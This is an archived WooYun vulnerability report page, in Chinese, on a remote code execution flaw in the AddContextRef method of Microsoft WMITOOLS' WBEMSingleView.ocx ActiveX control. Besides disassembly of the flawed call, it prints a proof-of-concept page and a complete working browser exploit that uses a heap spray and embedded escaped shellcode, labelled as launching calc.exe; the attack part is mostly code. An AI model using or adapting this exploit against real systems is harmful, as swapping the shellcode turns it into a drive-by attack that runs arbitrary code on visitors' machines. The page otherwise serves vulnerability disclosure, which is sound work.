@@ -1,0 +1,237 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		微软WMITOOLS远程代码执行漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		微软WMITOOLS远程代码执行漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/牛奶坦克">牛奶坦克</a> 
+</li><li>提交时间：		2010-12-22 12:10</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2010-12-22：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2010-12-22：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">微软提供的WMITOOLS存在一个远程代码执行漏洞,攻击者可以直接控制一个调用地址,让程序直接走到我们在内存中已经布置好的shellcode上.</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">微软提供的WMITOOLS存在一个远程代码执行漏洞,攻击者可以直接控制一个调用地址,让程序直接走到我们在内存中已经布置好的shellcode上.<br />
+<br />
+<br />
+<br />
+官方地址:<br />
+<br />
+http://www.microsoft.com/downloads/en/details.aspx?FamilyID=6430f853-1120-48db-8cc5-f2abdc3ed314&amp;displaylang=en<br />
+<br />
+<br />
+<br />
+漏洞出在WBEMSingleView.ocx的AddContextRef方法上.<br />
+<br />
+<br />
+<br />
+[id(0x00000018), helpstring(&quot;Increment Context Ref Count&quot;)]<br />
+<br />
+long AddContextRef(long lCtxtHandle);<br />
+<br />
+<br />
+<br />
+02D26BF9    837D 08 FF      cmp     dword ptr [ebp+8], -1<br />
+<br />
+02D26BFD    74 06           je      short 02D26C05<br />
+<br />
+02D26BFF    837D 08 00      cmp     dword ptr [ebp+8], 0<br />
+<br />
+02D26C03    75 07           jnz     short 02D26C0C<br />
+<br />
+02D26C05    B8 05400080     mov     eax, 80004005<br />
+<br />
+02D26C0A    EB 13           jmp     short 02D26C1F<br />
+<br />
+02D26C0C    8B45 08         mov     eax, dword ptr [ebp+8]		//可控的参数<br />
+<br />
+02D26C0F    8945 FC         mov     dword ptr [ebp-4], eax<br />
+<br />
+02D26C12    8B4D FC         mov     ecx, dword ptr [ebp-4]<br />
+<br />
+02D26C15    8B11            mov     edx, dword ptr [ecx]				//继续传,传给了edx<br />
+<br />
+02D26C17    8B45 FC         mov     eax, dword ptr [ebp-4]<br />
+<br />
+02D26C1A    50              push    eax<br />
+<br />
+02D26C1B    FF12            call    dword ptr [edx]					//控制了这个调用地址 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">POC:<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;object classid=&quot;clsid:2745E5F5-D234-11D0-847A-00C04FD7BB08&quot; id=&quot;target&quot;&gt;&lt;/object&gt;<br />
+<br />
+&lt;SCRIPT language=&quot;JavaScript&quot;&gt;<br />
+target.AddContextRef(0x0c0c0c0c);<br />
+&lt;/script&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/22153618ca4b278f97b35e37aa16cc1830ba2550.jpg" target="_blank"><img src="../images/22153618ca4b278f97b35e37aa16cc1830ba2550.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/22153637e0894493d22027684457bf49dc7e0e0e.jpg" target="_blank"><img src="../images/22153637e0894493d22027684457bf49dc7e0e0e.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+可执行shellcode的代码:<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;object classid=&quot;clsid:2745E5F5-D234-11D0-847A-00C04FD7BB08&quot; id=&quot;target&quot;&gt;&lt;/object&gt;<br />
+<br />
+&lt;SCRIPT language=&quot;JavaScript&quot;&gt;<br />
+//run calc.exe<br />
+var shellcode = unescape(&quot;%uc92b%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u0c13%u452b%u83df%ufceb%uf4e2%uc3f0%udf01%u2b0c%u9ace%ua030%uda39%u2a74%u54aa%u3343%u80ce%u2a2c%u96ae%u1f87%udece%u1ae2%u4685%uafa0%uab85%uea0b%ud28f%ue90d%u2bae%u7f37%udb61%uce79%u80ce%u2a28%ub9ae%u2787%u540e%u3753%u3444%u3787%udece%ua2e7%ufb19%ue808%u1f74%ua068%uef05%ueb89%ud33d%u6b87%u5449%u377c%u54e8%u2364%ud6ae%uab87%udff5%u2b0c%ub7ce%u7430%u2974%u7d6c%u27cc%ueb8f%u8f3e%udb64%udbcf%u4353%u21dd%u2586%u2012%u48eb%ub324%u2b6f%udf45%u0000&quot;);<br />
+<br />
+//先喷好堆<br />
+var bigblock = unescape(&quot;%u0C0C%u0C0C&quot;);<br />
+var headersize = 20;<br />
+var slackspace = headersize+shellcode.length;<br />
+while (bigblock.length&lt;slackspace) bigblock+=bigblock;<br />
+fillblock = bigblock.substring(0, slackspace);<br />
+block = bigblock.substring(0, bigblock.length-slackspace);<br />
+while(block.length+slackspace&lt;0x40000) block = block+block+fillblock;<br />
+memory = new Array();<br />
+for (x=0; x&lt;350; x++) memory[x] = block +shellcode;<br />
+<br />
+//让程序直接call过去<br />
+target.AddContextRef(0x0c0c0c0c);<br />
+&lt;/script&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">有问题,找微软. </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/牛奶坦克" title="牛奶坦克">牛奶坦克</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-01006" title="微软WMITOOLS远程代码执行漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：20 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="1006";
+var bugRating="2";
+var myRating="";
+var ratingCount="6";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
